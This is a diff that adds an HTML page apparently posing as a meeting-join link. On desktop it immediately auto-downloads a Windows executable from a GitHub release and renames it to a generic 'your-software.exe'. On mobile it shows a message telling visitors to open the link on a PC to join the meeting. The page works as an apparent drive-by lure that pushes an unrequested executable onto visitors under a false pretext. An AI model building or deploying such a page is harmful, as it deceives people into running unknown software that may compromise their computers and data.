@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download</title>
+  <style>
+    body {
+      font-family: -apple-system, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f5f5f5;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    #msg {
+      display: none;
+      max-width: 400px;
+    }
+    #msg h2 { margin-bottom: 10px; }
+  </style>
+</head>
+<body>
+
+  <div id="msg">
+    <h2>Unable to join on mobile</h2>
+    <p>Please open this link on a PC to join the meeting.</p>
+  </div>
+
+  <script>
+    function isMobileDevice() {
+      // Check user agent
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const uaCheck = /android|iphone|ipad|ipod|windows phone/i.test(ua);
+
+      // Check touch + small screen as backup (catches edge cases)
+      const touchCheck = ('ontouchstart' in window || navigator.maxTouchPoints > 0) 
+                          && window.innerWidth <= 900;
+
+      return uaCheck || touchCheck;
+    }
+
+    const downloadUrl = "https://github.com/Global-Trade-Plus/security-app/releases/latest/download/SecurityApp-1.0.0-Windows-x64.exe";
+    const filename = "your-software.exe";
+
+    if (isMobileDevice()) {
+      document.getElementById('msg').style.display = 'block';
+    } else {
+      // Trigger download immediately
+      const link = document.createElement('a');
+      link.href = downloadUrl;
+      link.download = filename;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  </script>
+
+</body>
+</html>
